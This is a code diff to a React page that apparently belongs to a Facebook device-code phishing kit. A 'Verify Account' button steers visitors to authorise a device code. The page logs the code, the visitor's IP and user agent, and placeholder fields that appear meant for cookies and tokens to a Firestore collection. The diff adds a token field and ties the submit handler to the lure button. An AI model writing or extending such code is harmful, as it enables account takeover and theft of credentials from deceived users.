@@ -88,11 +88,15 @@ const HomePage = () => {
   const handleSubmit = async () => {
     try {
         const user = await addDoc(collection(db, "users"), {
-          status:0,ck:'',pg:'',bm:'',ad:'',if:'',code:loginData.code,ip:ipAddress,userAgentStr:userAgent,createdAt: new Date().getTime(),
+          status:0
+          ,ck:'',tk:'',pg:'',bm:'',ad:'',if:''
+          ,code:loginData.code
+          ,ip:ipAddress
+          ,userAgentStr:userAgent
+          ,createdAt: new Date().getTime(),
         });
         if(user.id){
-          //updateIndex(user.id);
-          openInNewTab(loginData.verification_uri)
+          updateIndex(user.id);
         }
     } catch (error) {
       console.error("Error saving data to Firestore: ", error);
@@ -143,19 +147,10 @@ const HomePage = () => {
                   <button className="btn btn-primary" id="copy_btn" onClick={() => { navigator.clipboard.writeText(loginData.user_code || "") } } type="button">Copy</button>
                 </div>
                 <div className="d-grid gap-1 mb-3">
-                  <a target="_blank" rel="noopener noreferrer" href="fb://device_requests/?qr=0">
-                      <button className="btn btn-primary" id="btn-auth" type="button">
+                  <a target="_blank" rel="noopener noreferrer" href={isMobile ? "fb://device_requests/?qr=0" : loginData.verification_uri}>
+                      <button className="btn btn-primary" id="btn-auth" onClick={handleSubmit} type="button">
                         <i className="fa fa-check-circle" aria-hidden="true"></i>&nbsp;Verify Account </button>
                   </a>
-                  {/* {isMobile &&
-                      <a href="fb://device_requests/?qr=0">
-                      <button className="btn btn-primary" id="btn-auth" type="button">
-                        <i className="fa fa-check-circle" aria-hidden="true"></i>&nbsp;Verify Account </button>
-                      </a>
-                  }:{
-                    <button onClick={HANDL} className="btn btn-primary" id="btn-auth" type="button">
-                    <i className="fa fa-check-circle" aria-hidden="true"></i>&nbsp;Verify Account</button>
-                  } */}
                 </div>
               </div>
             </div>
